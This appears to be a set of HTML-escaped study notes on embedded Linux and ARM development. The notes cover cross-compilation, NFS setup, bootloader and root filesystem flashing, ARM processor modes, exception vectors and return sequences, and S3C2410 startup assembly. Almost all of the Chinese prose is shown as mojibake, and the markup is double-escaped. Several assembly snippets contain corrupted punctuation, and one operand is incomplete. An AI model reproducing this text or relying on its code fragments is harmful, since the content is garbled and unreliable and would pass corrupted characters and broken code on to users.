&lt;p>ç³»ç»éæï¼æç³»ç»çè½¯ä»¶ãç¡¬ä»¶åæ§è¡è£ç½®éæå¨ä¸èµ·ï¼è¿è¡è°è¯ï¼åç°å¹¶æ¹è¿ååè®¾è®¡è¿ç¨ä¸­çéè¯¯ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç³»ç»æµè¯ï¼å¯¹è®¾è®¡å¥½çç³»ç»è¿è¡æµè¯ï¼çå¶æ¯å¦æ»¡è¶³è§æ ¼è¯´æä¹¦ä¸­ç»å®çåè½è¦æ±ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="å¤çå¨åæä½ç³»ç»çéåä¸»è¦èèåªäºæ¹é¢">å¤çå¨åæä½ç³»ç»çéåä¸»è¦èèåªäºæ¹é¢ï¼&lt;/h4>
&lt;ul>
&lt;li>æä½ç³»ç»æ¬èº«ææä¾çå¼åå·¥å·ã&lt;/li>
&lt;li>æä½ç³»ç»åç¡¬ä»¶æ¥å£ç§»æ¤é¾åº¦ã&lt;/li>
&lt;li>æä½ç³»ç»çåå­è¦æ±ã&lt;/li>
&lt;li>å¼åäººåæ¯å¦çææ­¤æä½ç³»ç»åå¶æä¾çç³»ç»APIã&lt;/li>
&lt;li>æä½ç³»ç»æ¯å¦æä¾ç¡¬ä»¶çé©±å¨ç¨åºï¼å¦ç½å¡é©±å¨ç¨åºç­ã&lt;/li>
&lt;li>æä½ç³»ç»çæ¯å¦å·æå¯åªè£æ§ã&lt;/li>
&lt;li>æä½ç³»ç»æ¯å¦å·æå®æ¶æ§è½ã&lt;/li>
&lt;/ul>
&lt;h4 id="äº¤åå¼åäº¤åå¼åç¯å¢ä¸ºä½éè¦äº¤åå¼åç¯å¢">äº¤åå¼åãäº¤åå¼åç¯å¢ï¼ä¸ºä½éè¦äº¤åå¼åç¯å¢ï¼&lt;/h4>
&lt;p>äº¤åå¼åæ¯æå¨ä¸å°éç¨è®¡ç®æºï¼å®¿ä¸»æºï¼ä¸è¿è¡è½¯ä»¶çç¼è¾ç¼è¯ï¼ç¶åä¸è½½å°åµå¥å¼è®¾å¤ï¼ç®æ æºï¼ä¸­è¿è¡è°è¯çå¼åæ¹å¼&lt;/p>
&lt;p>äº¤åå¼åç¯å¢ä¸è¬ç±è¿è¡äºå®¿ä¸»æºä¸çäº¤åå¼åè½¯ä»¶ï¼assembler&amp;amp;&amp;amp;compiler&amp;amp;&amp;amp;linker&amp;amp;&amp;amp;debugger&amp;amp;&amp;amp;loaderï¼ãå®¿ä¸»æºå°ç®æ æºçè°è¯ééç»æ&lt;/p>
&lt;p>éè¦äº¤åå¼åç¯å¢æ¯å ä¸ºç®æ æºä¸è¬å¯¹ä½ç§¯ãåèç­æä¸¥æ ¼éå¶ï¼èµæºä¹é¢ååºç¨ï¼è¾ä¸ºç´§å¼ ï¼è¦æ±ä»ä»è½æµçè¿è¡ä»£ç å³å¯ï¼èå°ç¨æ·å¼åè½¯ä»¶ï¼åæ¬åç§åºãå·¥å·ï¼æ¾ç½®å¨ä¸»æºä¸ï¼èä¸ç°å¨çéæå¼åç¯å¢æä¾äºåç§ä¿®æ¹å¥½çåè½åºï¼ç¨èµ·æ¥ä¹æ¹ä¾¿ã&lt;/p>
&lt;h4 id="åµå¥å¼éæå¼åç¯å¢çä¸»è¦åè½">åµå¥å¼éæå¼åç¯å¢çä¸»è¦åè½ï¼&lt;/h4>
&lt;p>è¿æ¯ç±å¶ç»æå³å®çãAssemblerå°.cæºä»£ç æ±ç¼ï¼compilerå½¢æç®æ æä»¶ï¼linkeræ ¹æ®é¾æ¥æè¿°æä»¶å°åä¸ªç®æ ä»£ç é¾æ¥å®ä½çæå¯æ§è¡ä»£ç ãDebuggeræäºäº¤åå¼åå·¥å·æä¾äºä»¿çè°è¯ééãLoaderå¯ä»¥å°ç®æ æä»¶ç§å½è¿è®¾å¤ä¸­ï¼ææ¶éè¦åé¨å¼å¯¼ä»£ç çéåï¼&lt;/p>
&lt;h4 id="åµå¥å¼linux-å¼åä¸»è¦æµç¨">åµå¥å¼Linux å¼åä¸»è¦æµç¨ï¼&lt;/h4>
&lt;p>æ­å»ºå¼åç¯å¢âç§åbootloaderâç§ååæ ¸âç§åæ ¹æä»¶ç³»ç»âç§ååºç¨ç¨åºã&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å¼åç¯å¢ï¼REDHATï¼LINUXãä¸è½½ç¸åºçGCC
äº¤åç¼è¯å¨è¿è¡å®è£ãéç½®å¼åä¸»æºï¼éç½®MINICOMåéç½®ç½ç»ï¼MINICOM
è½¯ä»¶çä½ç¨æ¯ä½ä¸ºè°è¯åµå¥å¼å¼åæ¿ä¿¡æ¯è¾åºççè§å¨åé®çè¾å¥çå·¥å·ï¼éç½®ç½ç»ä¸»è¦æ¯éç½®IPå°åãNFSç½ç»æä»¶ç³»ç»ï¼éè¦å³é­é²ç«å¢ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç§åbootloaderï¼ä¸è½½ä¸äºå¬å¼æºä»£ç çBOOTLOADERæ ¹æ®èªå·±å·ä½è¯çè¿è¡ç§»æ¤ä¿®æ¹ã
æ³¨ï¼ä¸è½½æ¶ï¼æäºè¯çæ²¡æåç½®å¼å¯¼è£è½½ç¨åºï¼æ¯å¦ä¸æçARM7ãARM9ç³»åè¯çï¼è¿æ ·å°±éè¦ç¼åç§åå¼åæ¿ä¸flash çç§åç¨åºãæèç½ç»ä¸æåè´¹ä¸è½½çWINDOWS ä¸éè¿JTAG å¹¶å£ç®æä»¿çå¨ç§åARM å¤å´flashè¯ççç¨åºãä¹æLINUX ä¸å¬å¼æºä»£ç çJ-FLASH ç¨åºã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸è½½åæ ¸ï¼å¦ææä¸é¨éå¯¹ä½ æä½¿ç¨çCPU ç§»æ¤å¥½çLINUX æä½ç³»ç»é£æ¯åå¥½ä¸è¿ï¼ä¸è½½ååæ·»å èªå·±çç¹å®ç¡¬ä»¶çé©±å¨ç¨åºï¼è¿è¡è°è¯ä¿®æ¹ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸è½½æ ¹æä»¶ç³»ç»ï¼ä»www.busybox.net ä¸è½½ä½¿ç¨BUSYBOXè½¯ä»¶è¿è¡åè½è£åï¼äº§çä¸ä¸ªæåºæ¬çæ ¹æä»¶ç³»ç»ãæ ¹æä»¶ç³»ç»å¨åµå¥å¼ç³»ç»ä¸­ä¸è¬è®¾ä¸ºåªè¯»ï¼éè¦ä½¿ç¨mkcramfsãgenromfs ç­å·¥å·äº§çç§åæ è±¡æä»¶ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>æä»¶ç³»ç»å°±æ¯æä½ ç¡¬çä¸æ°æ®æç§ä¸å®æ ¼å¼ç»ç»æä¸æ£µæ ãæ°æ®åå¯¹åºåç§°ãå äºå®å°±ç¸å½äºæç¡¬çæ ¼å¼åäºãæ ¹æä»¶ç³»ç»å°±æ¯åºäºåæ ¸ä»¥å¤ï¼ææçç³»ç»æä»¶å­å¨çå°æ¹ãä¹æä»¥æä¸ºæ ¹ï¼æ¯å ä¸ºææ ¹æè½æçé¿ææ ï¼æ¯å¶å®æä»¶çæç»æè½½ç¹ãæä»¬è¦æç½æ ¹æä»¶ç³»ç»ååæ ¸æ¯å®å¨ç¬ç«çä¸¤ä¸ªé¨åï¼å®æ¯åæ ¸å¯å¨æ¶æmountçç¬¬ä¸ä¸ªæä»¶ç³»ç»ï¼éé¢æåæ ¸å¯å¨æå¿é¡»çæ°æ®ï¼ä¸ç¶å°±éåºå¯å¨æä»¶ç³»ç»è¿ç§æºå¶æå©äºç¨æ·åæä½ç³»ç»çäº¤äºãæ°æ®åå¯¹åºåç§°ãå°½ç®¡åæ ¸æ¯Linux çæ ¸å¿ï¼ä½æä»¶å´æ¯ç¨æ·ä¸æä½ç³»ç»äº¤äºæéç¨çä¸»è¦å·¥å·ï¼å°¤å¶æ¯LINUXã&lt;/p>
&lt;p>ä¸è½½ç¨æ·ç¨åº:å¯ä»¥ä¸è½½å°æ ¹æä»¶ç³»ç»ä¸­ï¼æçåºç¨ç¨åºä¸ä½¿ç¨æ ¹æä»¶ç³»ç»ï¼èæ¯ç´æ¥å°åºç¨ç¨åºååæ ¸è®¾è®¡å¨ä¸èµ·ï¼è¿æç¹ç±»ä¼¼äºUCOS-IIçæ¹å¼ã&lt;/p>
&lt;h4 id="åµå¥å¼linux-å¼åç¯å¢ä¸­éç½®nfsæå¡çç®ç">åµå¥å¼Linux å¼åç¯å¢ä¸­éç½®NFSæå¡çç®çï¼&lt;/h4>
&lt;p>å¯ä»¥ä½¿ä¸åæºå¨ãä¸åæä½ç³»ç»ä¹é´éè¿ç½ç»å±äº«æä»¶ï¼åè®¿é®æ¬å°æä»¶ä¸æ ·è®¿é®è¿ç«¯ç³»ç»ä¸çæä»¶ï¼å¨å¼åé¶æ®µï¼ä¸»æºå¶ä½åºäºNFSçæä»¶ç³»ç»ï¼å¶å®å¼æ¾ç®å½ï¼å¼æ¾å¯¹è±¡çIPèå´ï¼å°ç®å½æè½½å°åµå¥å¼è®¾å¤åï¼åµå¥å¼è®¾å¤å¯ä»¥æ¹ä¾¿å°è®¿é®ãä¿®æ¹ä¸»æºä¸»æºæä»¶ã&lt;/p>
&lt;h4 id="ä»ä¹æ¯ç¡¬ä»¶éå®å">ä»ä¹æ¯ç¡¬ä»¶éå®åï¼&lt;/h4>
&lt;p>ä¸è¯¾çèå¸ä¸¾å¾printfï¼ï¼æ¯ä¸ªå¾å¥½çä¾å­ï¼éå®åç¨åºæ¯é¢åç¼è¯ç¯å¢ä¸­çè¿æ¥å¨çï¼æ¯ç¨æ·èªå·±å®ä¹çCåºå½æ°ï¼æäºå®ï¼å¨ç¨åºè¿æ¥æ¶è¿æ¥å¨ä¼è¿æ¥ç¨æ·èªå·±ç¼åçCåºä¸­çåè½å½æ°èä¸æ¯æ åCåºãç¸å½äºå°æ åCåºè¿è¡äºä¸æ¬¡ç§»æ¤ãä»ä¸»æºç¯å¢å°å®éè¿è¡ç¯å¢çç§»æ¤ã&lt;/p>
&lt;p>æ¯å¦ï¼æ¬æ¥åºå½æ°fputc()æ¯æå­ç¬¦è¾åºå°è°è¯å¨æ§å¶çªå£ä¸­å»ç,ä½ç¨æ·æè¾åºè®¾å¤æ¹æäºUARTç«¯å£,è¿æ ·ä¸æ¥,ææåºäºfputc()å½æ°çprintf()ç³»åå½æ°è¾åºé½è¢«éå®åå°UARTç«¯å£ä¸å»äºãç¸å½äºå®ç°ç±»ä¼¼çåè½ï¼ä½æ¯åºå±çé©±å¨åäºã&lt;/p>
&lt;hr>
&lt;h3 id="armä½ç³»ç»æé¨å">ARMä½ç³»ç»æé¨å&lt;/h3>
&lt;h4 id="armç¡¬ä»¶çµè·¯æå°ç³»ç»ç»æ">ARMç¡¬ä»¶çµè·¯æå°ç³»ç»ç»æï¼&lt;/h4>
&lt;ul>
&lt;li>å¾®æ§å¶å¨ï¼ä¾å¦2410ï¼CPU+å¤è®¾æ¥å£/å¤è®¾æ§å¶å¨ï¼çµæºãæ¶éãå¤ä½ãå­å¨å¨ï¼SDRAM/FLASHï¼NOR8ä½ãNAND8 16 32ä½ï¼ï¼&lt;/li>
&lt;li>FLASHï¼å­æ¾æä½ç³»ç»ãç¨æ·ç¨åºç­éè¦æçµåä¿å­çæ°æ®&lt;/li>
&lt;li>SDRAMï¼ç³»ç»è¿è¡çä¸»è¦åºåï¼ç³»ç»åç¨æ·æ°æ®åå æ ï¼é½å¨è¿ä¸ªåºåãææ¶å¯å¨æ¨¡å¼éæ©
ææ¶éè¦JTAGï¼å¯¹è¯çåææé¨ä»¶è¿è¡è®¿é®ï¼éè¿è¯¥æ¥å£å¯¹ç³»ç»è°è¯ãç¼ç¨&lt;/li>
&lt;/ul>
&lt;h4 id="armå¤çå¨çä¸»è¦å·¥ä½æ¨¡å¼">ARMå¤çå¨çä¸»è¦å·¥ä½æ¨¡å¼ï¼&lt;/h4>
&lt;p>ARMç7ç§å¤çå¨æ¨¡å¼ï¼ä¸åçæ¨¡å¼ä¸æèªå·±çè¡ä¸ºååï¼&lt;/p>
&lt;ul>
&lt;li>USRï¼æ­£å¸¸ç¨åºæ§è¡æ¨¡å¼&lt;/li>
&lt;li>FIQï¼æ¯æé«éæ°æ®ä¼ éåééå¤ç&lt;/li>
&lt;li>IRQï¼ç¨äºéç¨ä¸­æ­çå¤çã&lt;/li>
&lt;li>ç®¡çï¼SVCï¼ï¼æä½ç³»ç»ä¿æ¤æ¨¡å¼&lt;/li>
&lt;li>ä¸­æ­¢&lt;/li>
&lt;li>æªå®ä¹&lt;/li>
&lt;li>ç³»ç»&lt;/li>
&lt;/ul>
&lt;p>é¤äºUSRä¹å¤ï¼å¶å®6ç§åç§°ä¸ºç¹ææ¨¡å¼ã6ä¸­ç§é¤äºç³»ç»æ¨¡å¼åç§°ä¸ºå¼å¸¸æ¨¡å¼ï¼å³å¤çå¼å¸¸æ¶çå·¥ä½æ¨¡å¼ï¼ã&lt;/p>
&lt;p>å¨è½¯ä»¶æ§å¶ä¸å¯ä»¥æ¹åæ¨¡å¼ï¼å³æ¹åCPSRç¸åºï¼ï¼å¤é¨ä¸­æ­æå¼å¸¸å¤çä¹å¼èµ·æ¨¡å¼ååï¼ç¨æ·æ¨¡å¼ä¸ä¸è½æ¹åæ¨¡å¼ã&lt;/p>
&lt;h4 id="æ ¸å¿å¯å­å¨çä½ç¨">æ ¸å¿å¯å­å¨çä½ç¨ï¼&lt;/h4>
&lt;p>R13éå¸¸ç¨ä½å æ æéï¼ç§°ä¸ºSPï¼è¢«åå§åä¸ºå¤ä¸ªæ¨¡å¼ä¸çå æ ãR14ç¨ä½å­ç¨åºè¿æ¥å¯å­å¨LRï¼ä¸­æ­å¼å¸¸ææ§è¡BLæ¶å¾å°PCå³R15çå¤ä»½ã&lt;/p>
&lt;p>Cpsrç¨åºç¶æå¯å­å¨ï¼32ä½åªç¨12ä½ï¼æææ¨¡å¼ä¸åå¯è§ã&lt;/p>
&lt;p>Spsrä¿å­ç¨åºç¶æå¯å­å¨ï¼å³åçå¼å¸¸æ¶å¯¹CPSRè¿è¡ä¿å­ï¼ä¿å­å½åç¶æã5ä¸ªå¼å¸¸æ¨¡å¼ä¸åæåèªçSPSRã&lt;/p>
&lt;h4 id="armå¤çå¨çå¯å¨è¿ç¨">ARMå¤çå¨çå¯å¨è¿ç¨ï¼&lt;/h4>
&lt;p>é¦åï¼çä¸ä¸ï¼ARMå¯å¨æ¶çç¡¬ä»¶æºå¶ï¼ä¸çµäº§çå¤ä½å¼å¸¸ï¼CPUå¼ºå¶PCä¸º0x00000000ï¼æ§è¡å¤ä½å¼å¸¸å¤çå½æ°ï¼æ¥ä¸æ¥å°±ç¸å½äºæ§è¡äºSTRARTUP.Sçåè½ãæ¯ç»ç¨æ·ç¨åºæ§è¡ç»ä»¥åéçå·¥ä½ç¯å¢ï¼è®¾ç½®ä¸­æ­åéè¡¨ãå æ ãæ¶éãå®æåå­æ·è´ç­ï¼ç¸å½äºSTARTUP.Sæèbootloaderçåç«¯ä»£ç ï¼æ¯å¼æºæ§è¡çç¨åºã.æ¿2410çå¯å¨ä»£ç ä¸¾ä¾ï¼å®å¯å¨CPUçè¿ç¨æ¯ï¼&lt;/p>
&lt;p>å¨èµ·å§å°ååéä¸­æ­åéè¡¨å³ä¸­æ­å¤çå½æ°ï¼CPUè¦æ±çï¼ï¼ä»¥ä¸ºåéç©ºé´åªæ4å­èï¼æä»¥ä¸è¬åªæ¯ä¸ä¸ªè·³è½¬æä»¤ï¼å»å«å¤æ§è¡ãå¨è·³å°å¤ä½å¼å¸¸ä¹åï¼å³é­ä¸­æ­ï¼å³é­çé¨çã&lt;/p>
&lt;ul>
&lt;li>ä¹ååå§åå­å¨å¨ç³»ç»&lt;/li>
&lt;li>åå§å¤ä¸ªæ¨¡å¼ä¸çå æ ï¼æ¨¡å¼åæ¢æ¶ï¼ç¡¬ä»¶ç»SPç½®ä½ï¼&lt;/li>
&lt;li>åå§åæç¹æ®è¦æ±çå¤å´è®¾å¤ï¼å¦LEDç¯ãçé¨ç&lt;/li>
&lt;li>åå§åç¨æ·çæ§è¡ç¯å¢ï¼å¨FLASHä¸­è¿è¡å¤ªæ¢äºï¼æä»£ç æ´ä½æ¬è¿å°RAMä¸­ï¼&lt;/li>
&lt;li>åæ¢å¤çå¨çå·¥ä½æ¨¡å¼&lt;/li>
&lt;li>è°ç¨ä¸»ç¨åº&lt;/li>
&lt;li>å¼å¸¸å¤ç&lt;/li>
&lt;/ul>
&lt;p>å½æ­£å¸¸çç¨åºæ§è¡æµç¨åçææ¶çåæ­¢æ¶ï¼ç§°ä¹ä¸ºå¼å¸¸ãå¯¹å¼å¸¸çå¤çæä¼åçº§ï¼å¤çå¼å¸¸éè¦è·³è½¬è³å¼å¸¸æ¨¡å¼ãå¹¶æ ¹æ®å¼å¸¸åéè·³è½¬è³ååºçå­ç¨åºï¼æ§è¡ä¹åå¿é¡»ä¿å­ç°åºï¼ï¼å³å¼å¸¸åºç°åå¼ºå¶è·³è½¬è³åºå®çå­å¨å¨å°åæ§è¡ãå¼å¸¸æ¯æ¯ä¸­æ­æ´å¤§çæ¦å¿µã&lt;/p>
&lt;h4 id="å¼å¸¸å¤ç">å¼å¸¸å¤ç&lt;/h4>
&lt;p>ARMæ7ç§å¼å¸¸ãåæ¬:&lt;/p>
&lt;ul>
&lt;li>å¤ä½ ç®¡çæ¨¡å¼ 0x00000000&lt;/li>
&lt;li>è½¯ä¸­æ­SWI ç®¡çæ¨¡å¼ 0x00000008&lt;/li>
&lt;li>IRQ IRQæ¨¡å¼ 0x00000018&lt;/li>
&lt;li>FIQ FIQæ¨¡å¼ 0x0000001c&lt;/li>
&lt;li>è¿åæ¬é¢åä¸­æ­¢ãæ°æ®ä¸­æ­¢ãæªå®ä¹&lt;/li>
&lt;/ul>
&lt;p>å¼å¸¸åºç°æ¶ï¼å¼å¸¸æ¨¡å¼åç»çR14åSPSRç¨äºä¿å­ä¸ä¸æ¡ç¨åºå°ååCPSRãå¼å¸¸è¿åæ¶ï¼SPSR-&amp;gt;CPSRï¼R14-&amp;gt;PC&lt;/p>
&lt;p>å¨å¯å¨ä»£ç ä¸­é¦åå°±æ¯è®¾ç½®æè°çå¼å¸¸åéè¡¨ï¼ä¹å°±æ¯å¨æå®çä½ç½®æ¾ç½®å¼å¸¸å¤çç¨åºï¼ä¸è¬æ¯è·³è½¬æä»¤ï¼ãå¼å¸¸åçæ¶ï¼CPUä¼æ ¹æ®è§å®å¼ºå¶ç½®PCï¼æ°å¥½å»æ§è¡æä»¬è®¾ç½®å¥½çè·³è½¬æä»¤ï¼æ¥çæ§è¡æå¡ç¨åºã&lt;/p>
&lt;h4 id="å¼å¸¸å¤çæµç¨ç¡¬ä»¶æºå¶åªåè¿äºè·ä»£ç æ å³">å¼å¸¸å¤çæµç¨ï¼ï¼ç¡¬ä»¶æºå¶ï¼åªåè¿äºï¼è·ä»£ç æ å³ï¼&lt;/h4>
&lt;ul>
&lt;li>æ ¹æ®å¼å¸¸ç±»åï¼å¼ºå¶è®¾ç½®CPSRçè¿è¡æ¨¡å¼ä½&lt;/li>
&lt;li>å¨åæ¢å°çå¼å¸¸æ¨¡å¼ä¸ï¼å¨å½åçé¾æ¥å¯å­å¨LR(r14)ä¸­ä¿å­ä¸ä¸ªæ¨¡å¼çPCå¼-4ï¼ä»¥ä¾¿ç¨åºå¨å¤çå¼å¸¸è¿åæ¶è½ä»æ­£ç¡®çä½ç½®éæ°å¼å§æ§è¡&lt;/li>
&lt;li>å°ä¸ä¸ä¸ªæ¨¡å¼çCPSRå¤å¶å°å½åå¼å¸¸æ¨¡å¼çSPSRä¸­ï¼æ³¨æ1ä¸2ã3ççç¾ï¼ä¸è½ç¬ç«æ§è¡ï¼ä½æ¯æ¯ç¡¬ä»¶å®ç°çï¼æ å³ä»£ç ï¼&lt;/li>
&lt;li>å¼ºå¶PCãç¶åå°±å°äºæ§è¡ä»£ç çæ¶åä»ç¸å³çå¼å¸¸åéå°ååä¸ä¸æ¡æä»¤æ§è¡ï¼ä»èè·³è½¬å°ç¸åºçå¼å¸¸å¤çç¨åºå¤ã&lt;/li>
&lt;/ul>
&lt;h4 id="å¼å¸¸è¿åæµç¨ææä»¤">å¼å¸¸è¿åæµç¨ï¼ï¼ææä»¤ï¼&lt;/h4>
&lt;ul>
&lt;li>å°LRå¯å­å¨ä¸­çå¼åå»ç¸åºçåç§»é(å¯¹äºIRQ/FIQæ¯4)éå°PCä¸­&lt;/li>
&lt;li>å° SPSR å¤å¶å CPSRï¼æ³¨æ1ä¸2ççç¾ï¼ä¸è½ç¬ç«æ§è¡ï¼ç¨ä¸æ¡å¸¦â§çæä»¤æ§è¡ï¼æä¹çé½æ¯ä¸æ¡ï¼&lt;/li>
&lt;li>æ¸é¤ç¦æ­¢ä¸­æ­æ å¿,å¦æå®è¢«è®¾ç½®æä½¿è½&lt;/li>
&lt;li>ææä¿®æ¹è¿çç¨æ·å¯å­å¨å¿é¡»ä»å¤çç¨åºçä¿æ¤å æ ä¸­æ¢å¤ï¼å³åºæ ï¼ã&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>å¯¹ä¸­æ­åµå¥çå¤ç(æ³¨æ)ï¼&lt;/strong>&lt;/p>
&lt;p>ä¿å­å¨LRä¸­çPCå¼ï¼åè¯¥å¼è¿åæ¶çå¤çè¿ç¨ã
å½IRQå¼å¸¸ä¸­æ­äº§çæ¶ï¼ç¨åºè®¡æ°å¨pcçå¼å·²ç»æ´æ°ï¼å®æåå½åæä»¤åé¢ç¬¬3æ¡æä»¤ï¼å¯¹äºARMæä»¤ï¼å®æåå½åæä»¤å°åå 12å­èçä½ç½®ï¼å½IRQå¼å¸¸ä¸­æ­äº§çæ¶ï¼å¤çå¨å°å¼ï¼pc-4ï¼ä¿å­å°IRQå¼å¸¸æ¨¡å¼ä¸çå¯å­å¨lr_irqä¸­ï¼å®æåå½åæä»¤ä¹åçç¬¬2æ¡æä»¤ï¼å æ­¤è¿åæä½å¯ä»¥éè¿ä¸é¢æä»¤å®ç°ï¼&lt;code>subs pc, lr, \#4&lt;/code>&lt;/p>
&lt;p>æä¸¤ç§è¿åæºå¶ï¼&lt;/p>
&lt;p>å½è¿åå°åä¿å­å¨å½åå¼å¸¸æ¨¡å¼çr14æ¶ä½¿ç¨å¶ä¸­ä¸ç§æºå¶
å½è¿åå°åä¿å­å¨å æ æ¶ä½¿ç¨å¦ä¸ç§æºå¶ï¼è¿ä¸­æ­çæ¶åä¿å­çï¼ã
è®¿é®æºå¶
&lt;code>SUBS PC,R14_fiq ,\#4&lt;/code>
ï¼ä¸åæ¨¡å¼æä¸åçæä»¤ï¼è¿åPCçåæ¶è¿åCPSRï¼ä¸æ¡æä»¤å®ç°ï¼&lt;/p>
&lt;pre>&lt;code class="language-c">SUB LR,LR,\#4``
STMFD R13!ï¼{R0ï¼R4-R12ï¼LR}
&lt;/code>&lt;/pre>
&lt;p>å°å¯å­å¨åè¡¨ä¸­çå¯å­å¨R0ï¼R4å°R12ï¼LRå­å¥å æ ã&lt;/p>
&lt;pre>&lt;code class="language-c">LDMFD R13!,{R0ï¼R4-R12ï¼PC} â§
&lt;/code>&lt;/pre>
&lt;p>å°å æ åå®¹æ¢å¤å°å¯å­å¨R0ï¼R4å°R12ï¼PCï¼åæ¶SPSRå¤å¶å°CPSRã{â§}ä¸ºå¯éåç¼ï¼å½æä»¤ä¸ºLDMä¸å¯å­å¨åè¡¨ä¸­åå«R15ï¼éç¨è¯¥åç¼æ¶è¡¨ç¤ºï¼é¤äºæ­£å¸¸çæ°æ®ä¼ éä¹å¤ï¼è¿å°SPSRå¤å¶å°CPSRï¼ä¸æ¡æä»¤å®ç°ã&lt;/p>
&lt;p>ä»£ç æä»¤åæï¼&lt;/p>
&lt;pre>&lt;code class="language-c">AREA Initï¼CODEï¼READONLYï¼ä»£ç æ®µInitãåªè¯»
â¦â¦
CODE32 ï¼32ä½ARMæä»¤é
LDR R0ï¼ï¼NEXTï¼1 ï¼ç»R0èµå°åå¼
BX R0 ï¼ç¨åºè·³ï¼å¹¶å°å¤çå¨åæ¢å°Thumbå·¥ä½ç¶æ
â¦â¦
CODE16 ï¼ 16ä½thumbæä»¤é
NEXT LDR R3ï¼ï¼0x3FF ç»R3èµå¼
â¦â¦
END
&lt;/code>&lt;/pre>
&lt;p>é«çº§è¯­è¨åæ±ç¼è¯­è¨å½æ°é´çç¸äºè°ç¨:
æ±ç¼è°ç¨Cï¼&lt;/p>
&lt;pre>&lt;code class="language-c">IMPORT Main ;éç¥ç¼è¯å¨è¯¥æ å·ä¸ºä¸ä¸ªå¤é¨æ å·
AREA Init,CODE,READONLY ï¼å®ä¹ä¸ä¸ªä»£ç æ®µ
ENTRY ï¼å®ä¹ç¨åºçå¥å£ç¹
LDR R0,=0x3FF0000 ï¼åå§åç³»ç»éç½®å¯å­å¨
LDR R1,=0xE7FFFF80
STR R1,[R0]
LDR SP,=0x3FE1000 ï¼åå§åç¨æ·å æ 
BL Main ï¼**è·³è½¬å°Mainï¼ï¼å½æ°å¤çC/C++ä»£ç æ§è¡**
END ï¼**æ è¯æ±ç¼ç¨åºçç»æ**
ä»¥ä¸çç¨åºæ®µå®æä¸äºç®åçåå§åï¼ç¶åè·³è½¬å°Mainï¼ï¼å½æ°ææ è¯çC/C ï¼ï¼ä»£ç å¤æ§è¡ä¸»è¦çä»»å¡ï¼æ­¤å¤çMainä»ä¸ºä¸ä¸ªæ å·ï¼ä¹å¯ä½¿ç¨å¶ä»åç§°ã
AREA Init , CODE , READONLY ;å·²å®ä¹ä»£ç æ®µ
ENTRYï¼ç¨åºå¥å£
LDR R0, =0x3ff5000ï¼R0èµå¯å­å¨å°åå¼
LDR R1, 0xï¼è¦ç»å¯å­å¨èµçå¼
STR R1,[R0]ï¼èµå¼
LDR R0, =0x3ff5008
LDR R1, 0x01
STR R1,[R0]ï¼ç»å¦ä¸ä¸ªå¯å­å¨èµå¼çè¿ç¨
BL PROCï¼è·³è½¬è³æ å·ä¸ºPROCçç¨åºåºæ§è¡
:
:
:
:
PROC
:
:
MOV PC, LR //å°LRä¿å­çç¨åºæéè¿åï¼å³**è·³å°BLä¸ä¸å¥æ¥çæ§è¡**
:
:
END
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h3 id="arm-2410è®¾è®¡ç¸å³">ARM 2410è®¾è®¡ç¸å³&lt;/h3>
&lt;h4 id="cpuå¤è®¾å¤è®¾æ§å¶å¨æ¶åºå¯å­å¨çç¸äºå³ç³»">CPUãå¤è®¾ãå¤è®¾æ§å¶å¨ãæ¶åºãå¯å­å¨çç¸äºå³ç³»ï¼&lt;/h4>
&lt;p>CPUä¸å¤è®¾æ§å¶å¨ææå¾®å¤çå¨ï¼å¾®å¤çå¨å¨æ ¸å¿æ¿ï¼æå°ç³»ç»ï¼ä¸åæ¥ä½ç¨ï¼å°å¼èéåæå¤è®¾æ¥å£å ä¸çµå¹³è½¬æ¢ç­å°±æ¯å¤å´æ¿ï¼å¤è®¾éè¿å¤å´æ¿è¿æ¥è³å¤è®¾æ§å¶å¨ãCPUéè¿å¯å­å¨ç¼ç¨æ§å¶å¤è®¾æ§å¶å¨äº§çæ¶åºæ§å¶å¤è®¾ãè¥æ¯æ²¡æå¤è®¾æ§å¶å¨ï¼åéè¦CPUèªå·±äº§çæ¶åºæ¥ä¸å¤è®¾äº¤äºï¼è¿ç§æ¶åºç¸å½äºä¸ç§çº¦å®å¥½çææè¡¨ç¤ºï¼ç¸å½äºâè¯­è¨âæèâéä¿¡åè®®âï¼&lt;/p>
&lt;p>&lt;strong>ä¾å¦&lt;/strong>ï¼è¥æ¯2410ä¸ä¸ä¸ªå¸¦æIICæ¥å£çå¨ä»¶éä¿¡ï¼åªéè¦è¿æ¥èµ·æ¥ï¼å¯¹IICè¿è¡å¯å­å¨ç¼ç¨ï¼æ§å¶å®ä»¬ä¹é´çå·¥ä½æ¨¡å¼ï¼å¯è½æ¶åæ°æ®å°±åæäºå¨ä¸­æ­ä¸­è¯»åå¯å­å¨æä½ï¼å±è½äºIICè§å®çéä¿¡ç»èãè¥æ¯51åçæºè¦ä¸IICéä¿¡çè¯ï¼å°±å¤æå¤äºï¼é¦åè¦ä»ç»éè¯»IICçåè®®ï¼ä¸å®¹ä¸æ¯«å·®éï¼ç¶åç¨IOå£æ¨¡ææ¶åºï¼CPUçå·¥ä½éå¾å¤§ã&lt;/p>
&lt;h4 id="å¯å­å¨ç¼ç¨çæ¬è´¨å¦ä½è·åå¯å­å¨çéç½®">å¯å­å¨ç¼ç¨çæ¬è´¨ï¼å¦ä½è·åå¯å­å¨çéç½®ï¼&lt;/h4>
&lt;p>å¯å­å¨ç¼ç¨çæ¬è´¨æ¯CPUæ§å¶å¤è®¾å¯å­å¨å·¥ä½æ¨¡å¼çæ¹æ³ãå¯ä»¥æ³è±¡å¯å­å¨çæ¯ä¸ä½è¯å®æ¯å¤è®¾æ§å¶å¨åè½æ¨¡åä¸­çä¸ä¸ªä¸ªâå¼å³âï¼ç»æä¸ä½èµå¼0æè1ï¼å°±ç¸å½äºä½¿è½æå³é­æä¸ä¸ªåè½ã&lt;/p>
&lt;h4 id="2410æå°çµè·¯è®¾è®¡æ¶æ¯éæ©å¯å¨éæ©æ°æ®å®½åº¦">2410æå°çµè·¯è®¾è®¡ï¼ï¼æ¶æ¯éæ©ãå¯å¨éæ©ãæ°æ®å®½åº¦ï¼&lt;/h4>
